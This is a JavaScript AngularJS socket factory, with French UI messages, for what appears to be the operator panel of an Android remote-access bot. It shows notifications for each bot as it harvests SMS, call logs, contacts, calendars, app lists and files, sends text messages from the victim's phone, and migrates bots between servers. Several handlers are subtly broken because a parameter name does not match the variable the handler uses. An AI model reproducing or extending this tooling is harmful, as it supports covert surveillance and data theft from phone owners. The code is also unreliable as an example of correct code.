App
    .factory('socket', [
        'socketFactory',
        'toastr',
        '$rootScope',
        function (socketFactory, toastr, $rootScope) {
            var reconnectTime = 5; //s
            var socket = socketFactory();

            socket.on('disconnect', function () {
                toastr.warning('Le panel est hors-ligne !', 'Déconnecté');
                $rootScope.connected = false
            })

            socket.on('connect', function () {
                socket.emit('admin')
                $rootScope.connected = true
            })

            socket.on('reconnect', function () {
                socket.emit('admin')
                $rootScope.connected = true
                toastr.clear();
                toastr.success('Le panel est en-ligne !', 'Connecté')

            })

            socket.on('bot:created', function (data) {
                toastr.success('Appareil crée !', device.device)
            })

            socket.on('bot:connected', function (device) {
                toastr.success(data.device + ' vient d\'allumer son téléphone !', data.device)
            });

            socket.on('bot:disconnected', function (device) {
                toastr.success(data.device + ' est désormais hors-ligne !', data.device)
            });

            socket.on('getmessages:started', function (device) {
                toastr.info('Récupération des SMS...', device.device)
            })
            socket.on('getmessages:done', function (device) {
                toastr.success('Les sms ont été récupérés.', device.device)
            })

            socket.on('getcallhistory:started', function (device) {
                toastr.info('Récupération de l\'historique d\'appels...', device.device)
            })
            socket.on('getcallhistory:done', function (device) {
                toastr.success('Récupération de l\'historique d\'appels terminé.', device.device)
            })

            socket.on('getapplisttask:started', function (device) {
                toastr.info('Récupération des applications...', device.device)
            })
            socket.on('getapplisttask:done', function (device) {
                toastr.success('Récupération des applications terminé.', device.device)
            })

            socket.on('nopermission', function (data) {
                console.log(data)
                toastr.error('L\'application n\'a pas la permission: ' + data.permission, data.device)
            })

            socket.on('download:started', function (data) {
                toastr.info('Téléchargement démaré', data.device)
            })

            socket.on('download:completed', function (data) {
                console.log(data)
                toastr.success('Téléchargement terminé', data.device)
            })

            socket.on('download:error', function (data) {
                toastr.error(data.error, data.device)
            })

            socket.on('getcontacts:started', function (data) {
                toastr.info('Récupération des contacts en cours.', data.device)
            })

            socket.on('getcontacts:completed', function (data) {
                toastr.success('Les contacts ont été récupérés.', data.device)
            })

            socket.on('calendar:started', function (data) {
                toastr.info('Récupération du calendrier en cours...', data.device)
            })

            socket.on('calendar:completed', function (data) {
                toastr.success('Calendrier récupéré.', data.device)
            })

            socket.on('command:unknown', function (data) {
                toastr.error('Commande inconnue: "' + data.command + '"', data.device)
            })

            socket.on('sendmessage:success', function (data) {
                toastr.success("Message envoyé à " + data.phone + ": " + data.textmessage, data.device)
            })

            socket.on('sendmessage:failed', function (data) {
                toastr.error("Impossible d'envoyé le message: " + data.message, data.device)
            })

            socket.on('transferbot:success', function (data) {
                toastr.success('L\'appareil a été migré sur le serveur ' + data.server, data.device)
            })

            socket.on('transferbot:failed', function (data) {
                toastr.error('Erreur lors du transfert sur le serveur ' + data.server + " Erreur: " + data.status, data.device)
            })

            socket.on('bot:transferring', function (data) {
                toastr.info('Bot is about to transfer to this server. Device: ' + data.device + " From: " + data.server)
            })

            return socket;
        }
    ])
